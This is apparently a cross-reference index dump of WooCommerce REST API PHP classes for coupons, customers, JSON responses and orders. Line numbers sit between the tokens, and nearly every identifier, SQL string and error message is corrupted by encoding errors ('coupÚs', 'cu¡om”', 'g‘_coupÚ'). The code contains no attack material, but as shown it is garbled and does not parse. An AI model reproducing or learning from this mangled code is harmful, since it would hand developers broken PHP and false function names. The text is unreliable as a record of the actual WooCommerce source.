, 'g‘_coupÚs' ), 
WC_API_S”v”
::
READABLE
 ),

39 #GET /
coupÚs
/
couÁ


40 
$rou‹s
[ 
$this
->
ba£
 . '/couÁ'] = 
	`¬¿y
(

41 
	`¬¿y
Ğ¬¿yĞ
$this
, 'g‘_coupÚs_couÁ' ), 
WC_API_S”v”
::
READABLE
 ),

44 #GET /
coupÚs
/<
id
>

45 
$rou‹s
[ 
$this
->
ba£
 . '/(?P<id>\d+)' ] = 
	`¬¿y
(

46 
	`¬¿y
Ğ¬¿yĞ
$this
, 'g‘_coupÚ' ), 
WC_API_S”v”
::
READABLE
 ),

49 #GET /
coupÚs
/
code
/<code>, 
nÙe
 
th©
 
coupÚ
 
codes
 
ÿn
 
cÚš
 
¥aûs
, 
dashes
 
ªd
 
und”scÜes


50 
$rou‹s
[ 
$this
->
ba£
 . '/code/(?P<code>\w[\w\s\-]*)' ] = 
	`¬¿y
(

51 
	`¬¿y
Ğ¬¿yĞ
$this
, 'g‘_coupÚ_by_code' ), 
WC_API_S”v”
::
READABLE
 ),

54  
$rou‹s
;

66 
public
 
funùiÚ
 
	`g‘_coupÚs
Ğ
$f›lds
 = 
nuÎ
, 
$f‹r
 = 
	`¬¿y
(), 
$·ge
 = 1 ) {

68 
$f‹r
['·ge'] = 
$·ge
;

70 
$qu”y
 = 
$this
->
	`qu”y_coupÚs
Ğ
$f‹r
 );

72 
$coupÚs
 = 
	`¬¿y
();

74 
	`fÜ—ch
Ğ
$qu”y
->
po¡s
 
as
 
$coupÚ_id
 ) {

76 iàĞ! 
$this
->
	`is_»adabË
Ğ
$coupÚ_id
 ) )

79 
$coupÚs
[] = 
	`cu¼’t
Ğ
$this
->
	`g‘_coupÚ
Ğ
$coupÚ_id
, 
$f›lds
 ) );

82 
$this
->
£rv”
->
	`add_·gš©iÚ_h—d”s
Ğ
$qu”y
 );

84  
	`¬¿y
Ğ'coupÚs' => 
$coupÚs
 );

85 
	}
}

95 
public
 
funùiÚ
 
	$g‘_coupÚ
Ğ
$id
, 
$f›lds
 = 
nuÎ
 ) {

96 
glob®
 
$wpdb
;

98 
$id
 = 
$this
->
	`v®id©e_»que¡
( $id, 'shop_coupon', 'read' );

100 iàĞ
	`is_wp_”rÜ
Ğ
$id
 ) )

101  
$id
;

104 
$code
 = 
$wpdb
->
	`g‘_v¬
Ğ$wpdb->
	`´•¬e
Ğ"SELECT…o¡_t™Ë FROM $wpdb->po¡ WHERE id = % AND…o¡_ty³ = 'shİ_coupÚ' AND…o¡_¡©u ğ'publish'", 
$id
 ) );

106 iàĞ
	`is_nuÎ
Ğ
$code
 ) )

107  
Ãw
 
	`WP_E¼Ü
Ğ'woocomm”û_­i_šv®id_coupÚ_id', 
	`__
Ğ'Inv®id coupÚ ID', 'woocomm”û' ), 
	`¬¿y
( 'status' => 404 ) );

109 
$coupÚ
 = 
Ãw
 
	`WC_CoupÚ
Ğ
$code
 );

111 
$coupÚ_po¡
 = 
	`g‘_po¡
Ğ
$coupÚ
->
id
 );

113 
$coupÚ_d©a
 = 
	`¬¿y
(

114 'id' => 
$coupÚ
->
id
,

115 'code' => 
$coupÚ
->
code
,

116 'ty³' => 
$coupÚ
->
ty³
,

117 'ü—‹d_©' => 
$this
->
£rv”
->
	`fÜm©_d©‘ime
Ğ
$coupÚ_po¡
->
po¡_d©e_gmt
 ),

118 'upd©ed_©' => 
$this
->
£rv”
->
	`fÜm©_d©‘ime
Ğ
$coupÚ_po¡
->
po¡_modif›d_gmt
 ),

119 'amouÁ' => 
	`wc_fÜm©_decim®
Ğ
$coupÚ
->
amouÁ
, 2 ),

120 'šdividu®_u£' => ( 'yes' ==ğ
$coupÚ
->
šdividu®_u£
 ),

121 '´oduù_ids' => 
	`¬¿y_m­
Ğ'absšt', (
¬¿y
è
$coupÚ
->
´oduù_ids
 ),

122 'exşude_´oduù_ids' => 
	`¬¿y_m­
Ğ'absšt', (
¬¿y
è
$coupÚ
->
exşude_´oduù_ids
 ),

123 'u§ge_lim™' => ( ! 
	`em±y
Ğ
$coupÚ
->
u§ge_lim™
 ) ) ? $coupÚ->u§ge_lim™ : 
nuÎ
,

124 'u§ge_lim™_³r_u£r' => ( ! 
	`em±y
Ğ
$coupÚ
->
u§ge_lim™_³r_u£r
 ) ) ? $coupÚ->u§ge_lim™_³r_u£¸: 
nuÎ
,

125 'lim™_u§ge_to_x_™ems' => (è
$coupÚ
->
lim™_u§ge_to_x_™ems
,

126 'u§ge_couÁ' => (è
$coupÚ
->
u§ge_couÁ
,

127 'expœy_d©e' => 
$this
->
£rv”
->
	`fÜm©_d©‘ime
Ğ
$coupÚ
->
expœy_d©e
 ),

128 '­¶y_befÜe_x' => 
$coupÚ
->
	`­¶y_befÜe_x
(),

129 '’abË_ä“_shpšg' => 
$coupÚ
->
	`’abË_ä“_shpšg
(),

130 '´oduù_ÿ‹gÜy_ids' => 
	`¬¿y_m­
Ğ'absšt', (
¬¿y
è
$coupÚ
->
´oduù_ÿ‹gÜ›s
 ),

131 'exşude_´oduù_ÿ‹gÜy_ids' => 
	`¬¿y_m­
Ğ'absšt', (
¬¿y
è
$coupÚ
->
exşude_´oduù_ÿ‹gÜ›s
 ),

132 'exşude_§Ë_™ems' => 
$coupÚ
->
	`exşude_§Ë_™ems
(),

133 'mšimum_amouÁ' => 
	`wc_fÜm©_decim®
Ğ
$coupÚ
->
mšimum_amouÁ
, 2 ),

134 'cu¡om”_emas' => 
$coupÚ
->
cu¡om”_ema
,

137  
	`¬¿y
Ğ'coupÚ' => 
	`­¶y_f‹rs
Ğ'woocomm”û_­i_coupÚ_»¥Ú£', 
$coupÚ_d©a
, 
$coupÚ
, 
$f›lds
, 
$this
->
£rv”
 ) );

138 
	}
}

147 
public
 
funùiÚ
 
g‘_coupÚs_couÁ
Ğ
$f‹r
 = 
	$¬¿y
() ) {

149 
$qu”y
 = 
$this
->
	`qu”y_coupÚs
Ğ
$f‹r
 );

151 iàĞ! 
	`cu¼’t_u£r_ÿn
( 'read_private_shop_coupons' ) )

152  
Ãw
 
	`WP_E¼Ü
Ğ'woocomm”û_­i_u£r_ÿÂÙ_»ad_coupÚs_couÁ', 
	`__
Ğ'You dØnÙ hav³rmissiÚØ»adhcoupÚ couÁ', 'woocomm”û' ), 
	`¬¿y
( 'status' => 401 ) );

154  
	`¬¿y
Ğ'couÁ' => (è
$qu”y
->
found_po¡s
 );

155 
	}
}

165 
public
 
funùiÚ
 
	$g‘_coupÚ_by_code
Ğ
$code
, 
$f›lds
 = 
nuÎ
 ) {

166 
glob®
 
$wpdb
;

168 
$id
 = 
$wpdb
->
	`g‘_v¬
Ğ$wpdb->
	`´•¬e
Ğ"SELECT id FROM $wpdb->po¡ WHERE…o¡_t™Ë = % AND…o¡_ty³ = 'shİ_coupÚ' AND…o¡_¡©u ğ'publish'", 
$code
 ) );

170 iàĞ
	`is_nuÎ
Ğ
$id
 ) )

171  
Ãw
 
	`WP_E¼Ü
Ğ'woocomm”û_­i_šv®id_coupÚ_code', 
	`__
Ğ'Inv®id coupÚ code', 'woocomm”û' ), 
	`¬¿y
( 'status' => 404 ) );

173  
$this
->
	`g‘_coupÚ
Ğ
$id
, 
$f›lds
 );

174 
	}
}

183 
public
 
funùiÚ
 
	$ü—‹_coupÚ
Ğ
$d©a
 ) {

185  
	`¬¿y
();

186 
	}
}

196 
public
 
funùiÚ
 
	$ed™_coupÚ
Ğ
$id
, 
$d©a
 ) {

198 
$id
 = 
$this
->
	`v®id©e_»que¡
( $id, 'shop_coupon', 'edit' );

200 iàĞ
	`is_wp_”rÜ
Ğ
$id
 ) )

201  
$id
;

203  
$this
->
	`g‘_coupÚ
Ğ
$id
 );

204 
	}
}

214 
public
 
funùiÚ
 
	$d–‘e_coupÚ
Ğ
$id
, 
$fÜû
 = 
çl£
 ) {

216 
$id
 = 
$this
->
	`v®id©e_»que¡
( $id, 'shop_coupon', 'delete' );

218 iàĞ
	`is_wp_”rÜ
Ğ
$id
 ) )

219  
$id
;

221  
$this
->
	`d–‘e
Ğ
$id
, 'shİ_coupÚ', ( 'Œue' ==ğ
$fÜû
 ) );

222 
	}
}

231 
´iv©e
 
funùiÚ
 
	$qu”y_coupÚs
Ğ
$¬gs
 ) {

234 
$qu”y_¬gs
 = 
	`¬¿y
(

240 
$qu”y_¬gs
 = 
$this
->
	`m”ge_qu”y_¬gs
Ğ$qu”y_¬gs, 
$¬gs
 );

242  
Ãw
 
	`WP_Qu”y
Ğ
$qu”y_¬gs
 );

243 
	}
}

	@includes/api/class-wc-api-customers.php

1 <?
php


13 iàĞ! 
defšed
Ğ'ABSPATH' ) ) 
	gex™
;

15 şas 
	cWC_API_Cu¡om”s
 
ex‹nds
 
	mWC_API_Resourû
 {

18 
´Ùeùed
 
	m$ba£
 = '/customers';

21 
´iv©e
 
	m$ü—‹d_©_mš
 = 
nuÎ
;

24 
´iv©e
 
	m$ü—‹d_©_max
 = 
nuÎ
;

33 
public
 
funùiÚ
 
	$__cÚ¡ruù
Ğ
WC_API_S”v”
 
$£rv”
 ) {

35 
·»Á
::
	`__cÚ¡ruù
Ğ
$£rv”
 );

38 
	`add_f‹r
Ğ'woocomm”û_­i_Üd”_»¥Ú£', 
	`¬¿y
Ğ
$this
, 'add_customer_data' ), 10, 2 );

41 
	`add_aùiÚ
Ğ'´e_u£r_qu”y', 
	`¬¿y
Ğ
$this
, 'modify_user_query' ) );

56 
public
 
funùiÚ
 
	$»gi¡”_rou‹s
Ğ
$rou‹s
 ) {

58 #GET /
cu¡om”s


59 
$rou‹s
[ 
$this
->
ba£
 ] = 
	`¬¿y
(

60 
	`¬¿y
Ğ¬¿yĞ
$this
, 'g‘_cu¡om”s' ), 
WC_API_SERVER
::
READABLE
 ),

63 #GET /
cu¡om”s
/
couÁ


64 
$rou‹s
[ 
$this
->
ba£
 . '/couÁ'] = 
	`¬¿y
(

65 
	`¬¿y
Ğ¬¿yĞ
$this
, 'g‘_cu¡om”s_couÁ' ), 
WC_API_SERVER
::
READABLE
 ),

68 #GET /
cu¡om”s
/<
id
>

69 
$rou‹s
[ 
$this
->
ba£
 . '/(?P<id>\d+)' ] = 
	`¬¿y
(

70 
	`¬¿y
Ğ¬¿yĞ
$this
, 'g‘_cu¡om”' ), 
WC_API_SERVER
::
READABLE
 ),

73 #GET /
cu¡om”s
/<
id
>/
Üd”s


74 
$rou‹s
[ 
$this
->
ba£
 . '/(?P<id>\d+)/Üd”s' ] = 
	`¬¿y
(

75 
	`¬¿y
Ğ¬¿yĞ
$this
, 'g‘_cu¡om”_Üd”s' ), 
WC_API_SERVER
::
READABLE
 ),

78  
$rou‹s
;

79 
	}
}

90 
public
 
funùiÚ
 
g‘_cu¡om”s
Ğ
$f›lds
 = 
nuÎ
, 
$f‹r
 = 
¬¿y
(), 
$·ge
 = 1 ) {

92 
$f‹r
['·ge'] = 
$·ge
;

94 
	g$qu”y
 = 
$this
->
qu”y_cu¡om”s
Ğ
$f‹r
 );

96 
	g$cu¡om”s
 = 
¬¿y
();

98 
fÜ—ch
Ğ
$qu”y
->
g‘_»suÉs
(è
as
 
$u£r_id
 ) {

100 iàĞ! 
	g$this
->
is_»adabË
Ğ
$u£r_id
 ) )

103 
	g$cu¡om”s
[] = 
cu¼’t
Ğ
$this
->
g‘_cu¡om”
Ğ
$u£r_id
, 
$f›lds
 ) );

106 
	g$this
->
	g£rv”
->
add_·gš©iÚ_h—d”s
Ğ
$qu”y
 );

108  
¬¿y
Ğ'cu¡om”s' => 
$cu¡om”s
 );

119 
public
 
funùiÚ
 
	$g‘_cu¡om”
Ğ
$id
, 
$f›lds
 = 
nuÎ
 ) {

120 
glob®
 
$wpdb
;

122 
$id
 = 
$this
->
	`v®id©e_»que¡
( $id, 'customer', 'read' );

124 iàĞ
	`is_wp_”rÜ
Ğ
$id
 ) )

125  
$id
;

127 
$cu¡om”
 = 
Ãw
 
	`WP_U£r
Ğ
$id
 );

130 
$Ï¡_Üd”
 = 
$wpdb
->
	`g‘_row
( "SELECT id,…ost_date_gmt

131 
FROM
 
$wpdb
->
po¡s
 
AS
…osts

132 
LEFT
 
JOIN
 {
$wpdb
->
po¡m‘a
} 
AS
 
m‘a
 
Ú
 
po¡s
.
ID
 = m‘a.
po¡_id


133 
WHERE
 
m‘a
.
m‘a_key
 = '_customer_user'

134 
AND
 
m‘a
.
m‘a_v®ue
 = {
$cu¡om”
->
ID
}

135 
AND
 
po¡s
.
po¡_ty³
 = 'shop_order'

136 
AND
 
po¡s
.
po¡_¡©us
 = 'publish'

139 
$cu¡om”_d©a
 = 
	`¬¿y
(

140 'id' => 
$cu¡om”
->
ID
,

141 'ü—‹d_©' => 
$this
->
£rv”
->
	`fÜm©_d©‘ime
Ğ
$cu¡om”
->
u£r_»gi¡”ed
 ),

142 'ema' => 
$cu¡om”
->
u£r_ema
,

143 'fœ¡_Çme' => 
$cu¡om”
->
fœ¡_Çme
,

144 'Ï¡_Çme' => 
$cu¡om”
->
Ï¡_Çme
,

145 'u£ºame' => 
$cu¡om”
->
u£r_logš
,

146 'Ï¡_Üd”_id' => 
	`is_objeù
Ğ
$Ï¡_Üd”
 ) ? $Ï¡_Üd”->
id
 : 
nuÎ
,

147 'Ï¡_Üd”_d©e' => 
	`is_objeù
Ğ
$Ï¡_Üd”
 ) ? 
$this
->
£rv”
->
	`fÜm©_d©‘ime
Ğ$Ï¡_Üd”->
po¡_d©e_gmt
 ) : 
nuÎ
,

148 'Üd”s_couÁ' => (è
$cu¡om”
->
_Üd”_couÁ
,

149 'tÙ®_¥’t' => 
	`wc_fÜm©_decim®
Ğ
$cu¡om”
->
_mÚey_¥’t
, 2 ),

150 'av©¬_u¾' => 
$this
->
	`g‘_av©¬_u¾
Ğ
$cu¡om”
->
cu¡om”_ema
 ),

151 'blšg_add»ss' => 
	`¬¿y
(

152 'fœ¡_Çme' => 
$cu¡om”
->
blšg_fœ¡_Çme
,

153 'Ï¡_Çme' => 
$cu¡om”
->
blšg_Ï¡_Çme
,

154 'com·ny' => 
$cu¡om”
->
blšg_com·ny
,

155 'add»ss_1' => 
$cu¡om”
->
blšg_add»ss_1
,

156 'add»ss_2' => 
$cu¡om”
->
blšg_add»ss_2
,

157 'c™y' => 
$cu¡om”
->
blšg_c™y
,

158 '¡©e' => 
$cu¡om”
->
blšg_¡©e
,

159 'po¡code' => 
$cu¡om”
->
blšg_po¡code
,

160 'couÁry' => 
$cu¡om”
->
blšg_couÁry
,

161 'ema' => 
$cu¡om”
->
blšg_ema
,

162 'phÚe' => 
$cu¡om”
->
blšg_phÚe
,

164 'shpšg_add»ss' => 
	`¬¿y
(

165 'fœ¡_Çme' => 
$cu¡om”
->
shpšg_fœ¡_Çme
,

166 'Ï¡_Çme' => 
$cu¡om”
->
shpšg_Ï¡_Çme
,

167 'com·ny' => 
$cu¡om”
->
shpšg_com·ny
,

168 'add»ss_1' => 
$cu¡om”
->
shpšg_add»ss_1
,

169 'add»ss_2' => 
$cu¡om”
->
shpšg_add»ss_2
,

170 'c™y' => 
$cu¡om”
->
shpšg_c™y
,

171 '¡©e' => 
$cu¡om”
->
shpšg_¡©e
,

172 'po¡code' => 
$cu¡om”
->
shpšg_po¡code
,

173 'couÁry' => 
$cu¡om”
->
shpšg_couÁry
,

177  
	`¬¿y
Ğ'cu¡om”' => 
	`­¶y_f‹rs
Ğ'woocomm”û_­i_cu¡om”_»¥Ú£', 
$cu¡om”_d©a
, 
$cu¡om”
, 
$f›lds
, 
$this
->
£rv”
 ) );

178 
	}
}

187 
public
 
funùiÚ
 
g‘_cu¡om”s_couÁ
Ğ
$f‹r
 = 
	$¬¿y
() ) {

189 
$qu”y
 = 
$this
->
	`qu”y_cu¡om”s
Ğ
$f‹r
 );

191 iàĞ! 
	`cu¼’t_u£r_ÿn
( 'list_users' ) )

192  
Ãw
 
	`WP_E¼Ü
Ğ'woocomm”û_­i_u£r_ÿÂÙ_»ad_cu¡om”s_couÁ', 
	`__
Ğ'You dØnÙ hav³rmissiÚØ»adhcu¡om” couÁ', 'woocomm”û' ), 
	`¬¿y
( 'status' => 401 ) );

194  
	`¬¿y
Ğ'couÁ' => 
	`couÁ
Ğ
$qu”y
->
	`g‘_»suÉs
() ) );

195 
	}
}

205 
public
 
funùiÚ
 
	$ü—‹_cu¡om”
Ğ
$d©a
 ) {

207 iàĞ! 
	`cu¼’t_u£r_ÿn
( 'create_users' ) )

208  
Ãw
 
	`WP_E¼Ü
Ğ'woocomm”û_­i_u£r_ÿÂÙ_ü—‹_cu¡om”', 
	`__
Ğ'You dØnÙ hav³rmissiÚØü—‹hi cu¡om”', 'woocomm”û' ), 
	`¬¿y
( 'status' => 401 ) );

210  
	`¬¿y
();

211 
	}
}

221 
public
 
funùiÚ
 
	$ed™_cu¡om”
Ğ
$id
, 
$d©a
 ) {

223 
$id
 = 
$this
->
	`v®id©e_»que¡
( $id, 'customer', 'edit' );

225 iàĞ! 
	`is_wp_”rÜ
Ğ
$id
 ) )

226  
$id
;

228  
$this
->
	`g‘_cu¡om”
Ğ
$id
 );

229 
	}
}

238 
public
 
funùiÚ
 
	$d–‘e_cu¡om”
Ğ
$id
 ) {

240 
$id
 = 
$this
->
	`v®id©e_»que¡
( $id, 'customer', 'delete' );

242 iàĞ! 
	`is_wp_”rÜ
Ğ
$id
 ) )

243  
$id
;

245  
$this
->
	`d–‘e
Ğ
$id
, 'customer' );

246 
	}
}

256 
public
 
funùiÚ
 
	$g‘_cu¡om”_Üd”s
Ğ
$id
, 
$f›lds
 = 
nuÎ
 ) {

257 
glob®
 
$wpdb
;

259 
$id
 = 
$this
->
	`v®id©e_»que¡
( $id, 'customer', 'read' );

261 iàĞ
	`is_wp_”rÜ
Ğ
$id
 ) )

262  
$id
;

264 
$Üd”_ids
 = 
$wpdb
->
	`g‘_cŞ
Ğ$wpdb->
	`´•¬e
( "SELECT id

265 
FROM
 
$wpdb
->
po¡s
 
AS
…osts

266 
LEFT
 
JOIN
 {
$wpdb
->
po¡m‘a
} 
AS
 
m‘a
 
Ú
 
po¡s
.
ID
 = m‘a.
po¡_id


267 
WHERE
 
m‘a
.
m‘a_key
 = '_customer_user'

268 
AND
 
m‘a
.
m‘a_v®ue
 = '%s'

269 
AND
 
po¡s
.
po¡_ty³
 = 'shop_order'

270 
AND
 
po¡s
.
po¡_¡©us
 = 'publish'

273 iàĞ
	`em±y
Ğ
$Üd”_ids
 ) )

274  
	`¬¿y
( 'orders' =>‡rray() );

276 
$Üd”s
 = 
	`¬¿y
();

278 
	`fÜ—ch
 ( 
$Üd”_ids
 
as
 
$Üd”_id
 ) {

279 
$Üd”s
[] = 
	`cu¼’t
Ğ
	`WC
()->
­i
->
WC_API_Ord”s
->
	`g‘_Üd”
Ğ
$Üd”_id
, 
$f›lds
 ) );

282  
	`¬¿y
Ğ'Üd”s' => 
	`­¶y_f‹rs
Ğ'woocomm”û_­i_cu¡om”_Üd”s_»¥Ú£', 
$Üd”s
, 
$id
, 
$f›lds
, 
$Üd”_ids
, 
$this
->
£rv”
 ) );

283 
	}
}

295 
´iv©e
 
funùiÚ
 
qu”y_cu¡om”s
Ğ
$¬gs
 = 
	$¬¿y
() ) {

298 
$u£rs_³r_·ge
 = 
	`g‘_İtiÚ
( 'posts_per_page' );

301 
$qu”y_¬gs
 = 
	`¬¿y
(

305 'numb”' => 
$u£rs_³r_·ge
,

309 iàĞ! 
	`em±y
Ğ
$¬gs
['q'] ) ) {

310 
$qu”y_¬gs
['£¬ch'] = 
$¬gs
['q'];

314 iàĞ! 
	`em±y
Ğ
$¬gs
['limit'] ) ) {

316 
$qu”y_¬gs
['numb”'] = 
	`absšt
Ğ
$¬gs
['limit'] );

318 
$u£rs_³r_·ge
 = 
	`absšt
Ğ
$¬gs
['limit'] );

322 
$·ge
 = ( 
	`is£t
Ğ
$¬gs
['·ge'] ) ) ? 
	`absšt
( $args['page'] ) : 1;

325 iàĞ! 
	`em±y
Ğ
$¬gs
['offset'] ) ) {

326 
$qu”y_¬gs
['off£t'] = 
	`absšt
Ğ
$¬gs
['offset'] );

328 
$qu”y_¬gs
['off£t'] = 
$u£rs_³r_·ge
 * ( 
$·ge
 - 1 );

332 iàĞ! 
	`em±y
Ğ
$¬gs
['created_at_min'] ) ) {

333 
$this
->
ü—‹d_©_mš
 = $this->
£rv”
->
	`·r£_d©‘ime
Ğ
$¬gs
['created_at_min'] );

336 iàĞ! 
	`em±y
Ğ
$¬gs
['created_at_max'] ) ) {

337 
$this
->
ü—‹d_©_max
 = $this->
£rv”
->
	`·r£_d©‘ime
Ğ
$¬gs
['created_at_max'] );

340 
$qu”y
 = 
Ãw
 
	`WP_U£r_Qu”y
Ğ
$qu”y_¬gs
 );

343 
$qu”y
->
tÙ®_·ges
 = 
	`û
Ğ$qu”y->
	`g‘_tÙ®
(è/ 
$u£rs_³r_·ge
 );

344 
$qu”y
->
·ge
 = 
$·ge
;

346  
$qu”y
;

347 
	}
}

357 
public
 
funùiÚ
 
	$add_cu¡om”_d©a
Ğ
$Üd”_d©a
, 
$Üd”
 ) {

359 iàĞ0 =ğ
$Üd”
->
cu¡om”_u£r
 ) {

362 
$Üd”_d©a
['cu¡om”'] = 
	`¬¿y
(

364 'ema' => 
$Üd”
->
blšg_ema
,

365 'fœ¡_Çme' => 
$Üd”
->
blšg_fœ¡_Çme
,

366 'Ï¡_Çme' => 
$Üd”
->
blšg_Ï¡_Çme
,

367 'blšg_add»ss' => 
	`¬¿y
(

368 'fœ¡_Çme' => 
$Üd”
->
blšg_fœ¡_Çme
,

369 'Ï¡_Çme' => 
$Üd”
->
blšg_Ï¡_Çme
,

370 'com·ny' => 
$Üd”
->
blšg_com·ny
,

371 'add»ss_1' => 
$Üd”
->
blšg_add»ss_1
,

372 'add»ss_2' => 
$Üd”
->
blšg_add»ss_2
,

373 'c™y' => 
$Üd”
->
blšg_c™y
,

374 '¡©e' => 
$Üd”
->
blšg_¡©e
,

375 'po¡code' => 
$Üd”
->
blšg_po¡code
,

376 'couÁry' => 
$Üd”
->
blšg_couÁry
,

377 'ema' => 
$Üd”
->
blšg_ema
,

378 'phÚe' => 
$Üd”
->
blšg_phÚe
,

380 'shpšg_add»ss' => 
	`¬¿y
(

381 'fœ¡_Çme' => 
$Üd”
->
shpšg_fœ¡_Çme
,

382 'Ï¡_Çme' => 
$Üd”
->
shpšg_Ï¡_Çme
,

383 'com·ny' => 
$Üd”
->
shpšg_com·ny
,

384 'add»ss_1' => 
$Üd”
->
shpšg_add»ss_1
,

385 'add»ss_2' => 
$Üd”
->
shpšg_add»ss_2
,

386 'c™y' => 
$Üd”
->
shpšg_c™y
,

387 '¡©e' => 
$Üd”
->
shpšg_¡©e
,

388 'po¡code' => 
$Üd”
->
shpšg_po¡code
,

389 'couÁry' => 
$Üd”
->
shpšg_couÁry
,

395 
$Üd”_d©a
['cu¡om”'] = 
	`cu¼’t
Ğ
$this
->
	`g‘_cu¡om”
Ğ
$Üd”
->
cu¡om”_u£r
 ) );

398  
$Üd”_d©a
;

399 
	}
}

407 
public
 
funùiÚ
 
	$modify_u£r_qu”y
Ğ
$qu”y
 ) {

409 iàĞ
$this
->
ü—‹d_©_mš
 )

410 
$qu”y
->
qu”y_wh”e
 .ğ
	`¥rštf
Ğ" AND u£r_»gi¡”ed >ğSTR_TO_DATEĞ'%s', '%%Y-%%m-%%d %%h:%%i:%%s' )", 
	`esc_sql
Ğ
$this
->
ü—‹d_©_mš
 ) );

412 iàĞ
$this
->
ü—‹d_©_max
 )

413 
$qu”y
->
qu”y_wh”e
 .ğ
	`¥rštf
Ğ" AND u£r_»gi¡”ed <ğSTR_TO_DATEĞ'%s', '%%Y-%%m-%%d %%h:%%i:%%s' )", 
	`esc_sql
Ğ
$this
->
ü—‹d_©_max
 ) );

414 
	}
}

424 
´iv©e
 
funùiÚ
 
	$g‘_av©¬_u¾
Ğ
$ema
 ) {

426 
$dom
 = 
Ãw
 
	`DOMDocum’t
();

428 
$dom
->
	`lßdHTML
Ğ
	`g‘_av©¬
Ğ
$ema
 ) );

430 
$u¾
 = 
$dom
->
	`g‘EËm’tsByTagName
Ğ'img' )->
	`™em
Ğ0 )->
	`g‘A‰ribu‹
( 'src' );

432  ( ! 
	`em±y
Ğ
$u¾
 ) ) ? $u¾ : 
nuÎ
;

433 
	}
}

449 
´Ùeùed
 
funùiÚ
 
	$v®id©e_»que¡
Ğ
$id
, 
$ty³
, 
$cÚ‹xt
 ) {

451 
$id
 = 
	`absšt
( $id );

454 iàĞ
	`em±y
Ğ
$id
 ) )

455  
Ãw
 
	`WP_E¼Ü
Ğ'woocomm”û_­i_šv®id_cu¡om”_id', 
	`__
Ğ'Inv®id cu¡om” ID', 'woocomm”û' ), 
	`¬¿y
( 'status' => 404 ) );

458 
$cu¡om”
 = 
Ãw
 
	`WP_U£r
Ğ
$id
 );

460 iàĞ0 ==ğ
$cu¡om”
->
ID
 )

461  
Ãw
 
	`WP_E¼Ü
Ğ'woocomm”û_­i_šv®id_cu¡om”', 
	`__
Ğ'Inv®id cu¡om”', 'woocomm”û' ), 
	`¬¿y
( 'status' => 404 ) );

464  
$cÚ‹xt
 ) {

467 iàĞ! 
	`cu¼’t_u£r_ÿn
( 'list_users' ) )

468  
Ãw
 
	`WP_E¼Ü
Ğ'woocomm”û_­i_u£r_ÿÂÙ_»ad_cu¡om”', 
	`__
Ğ'You dØnÙ hav³rmissiÚØ»adhi cu¡om”', 'woocomm”û' ), 
	`¬¿y
( 'status' => 401 ) );

472 iàĞ! 
	`cu¼’t_u£r_ÿn
( 'edit_users' ) )

473  
Ãw
 
	`WP_E¼Ü
Ğ'woocomm”û_­i_u£r_ÿÂÙ_ed™_cu¡om”', 
	`__
Ğ'You dØnÙ hav³rmissiÚØed™hi cu¡om”', 'woocomm”û' ), 
	`¬¿y
( 'status' => 401 ) );

477 iàĞ! 
	`cu¼’t_u£r_ÿn
( 'delete_users' ) )

478  
Ãw
 
	`WP_E¼Ü
Ğ'woocomm”û_­i_u£r_ÿÂÙ_d–‘e_cu¡om”', 
	`__
Ğ'You dØnÙ hav³rmissiÚØd–‘thi cu¡om”', 'woocomm”û' ), 
	`¬¿y
( 'status' => 401 ) );

482  
$id
;

483 
	}
}

493 
´Ùeùed
 
funùiÚ
 
	$is_»adabË
Ğ
$po¡
 ) {

495  
	`cu¼’t_u£r_ÿn
( 'list_users' );

496 
	}
}

	@includes/api/class-wc-api-json-handler.php

1 <?
php


13 iàĞ! 
defšed
Ğ'ABSPATH' ) ) 
	gex™
;

15 şas 
	cWC_API_JSON_HªdËr
 
im¶em’ts
 
	mWC_API_HªdËr
 {

23 
public
 
funùiÚ
 
	$g‘_cÚ‹Á_ty³
() {

25  '­¶iÿtiÚ/jsÚ; ch¬£t=' . 
	`g‘_İtiÚ
( 'blog_charset' );

35 
public
 
funùiÚ
 
	$·r£_body
Ğ
$body
 ) {

37  
	`jsÚ_decode
Ğ
$body
, 
Œue
 );

38 
	}
}

47 
public
 
funùiÚ
 
	$g’”©e_»¥Ú£
Ğ
$d©a
 ) {

49 iàĞ
	`is£t
Ğ
$_GET
['_jsonp'] ) ) {

52 iàĞ! 
	`­¶y_f‹rs
Ğ'woocomm”û_­i_jsÚp_’abËd', 
Œue
 ) ) {

54 
	`WC
()->
­i
->
£rv”
->
	`£nd_¡©us
( 400 );

56 
$d©a
 = 
	`¬¿y
Ğ¬¿yĞ'code' => 'woocomm”û_­i_jsÚp_di§bËd', 'mes§ge' => 
	`__
( 'JSONP support is disabled onhis site', 'woocommerce' ) ) );

60 iàĞ
	`´eg_m©ch
Ğ'/\W/', 
$_GET
['_jsonp'] ) ) {

62 
	`WC
()->
­i
->
£rv”
->
	`£nd_¡©us
( 400 );

64 
$d©a
 = 
	`¬¿y
Ğ¬¿yĞ'code' => 'woocomm”û_­i_jsÚp_ÿÎback_šv®id', 
	`__
( 'The JSONP callback function is invalid', 'woocommerce' ) ) );

67  
$_GET
['_jsÚp'] . '(' . 
	`jsÚ_’code
Ğ
$d©a
 ) . ')';

70  
	`jsÚ_’code
Ğ
$d©a
 );

71 
	}
}

	@includes/api/class-wc-api-orders.php

1 <?
php


13 iàĞ! 
defšed
Ğ'ABSPATH' ) ) 
	gex™
;

15 şas 
	cWC_API_Ord”s
 
ex‹nds
 
	mWC_API_Resourû
 {

18 
´Ùeùed
 
	m$ba£
 = '/orders';

32 
public
 
funùiÚ
 
	$»gi¡”_rou‹s
Ğ
$rou‹s
 ) {

34 #GET /
Üd”s


35 
$rou‹s
[ 
$this
->
ba£
 ] = 
	`¬¿y
(

36 
	`¬¿y
Ğ¬¿yĞ
$this
, 'g‘_Üd”s' ), 
WC_API_S”v”
::
READABLE
 ),

39 #GET /
Üd”s
/
couÁ


40 
$rou‹s
[ 
$this
->
ba£
 . '/couÁ'] = 
	`¬¿y
(

41 
	`¬¿y
Ğ¬¿yĞ
$this
, 'g‘_Üd”s_couÁ' ), 
WC_API_S”v”
::
READABLE
 ),

44 #GET|
PUT
 /
Üd”s
/<
id
>

45 
$rou‹s
[ 
$this
->
ba£
 . '/(?P<id>\d+)' ] = 
	`¬¿y
(

46 
	`¬¿y
Ğ¬¿yĞ
$this
, 'g‘_Üd”' ), 
WC_API_S”v”
::
READABLE
 ),

47 
	`¬¿y
Ğ¬¿yĞ
$this
, 'ed™_Üd”' ), 
WC_API_S”v”
::
EDITABLE
 | WC_API_S”v”::
ACCEPT_DATA
 ),

50 #GET /
Üd”s
/<
id
>/
nÙes


51 
$rou‹s
[ 
$this
->
ba£
 . '/(?P<id>\d+)/nÙes' ] = 
	`¬¿y
(

52 
	`¬¿y
Ğ¬¿yĞ
$this
, 'g‘_Üd”_nÙes' ), 
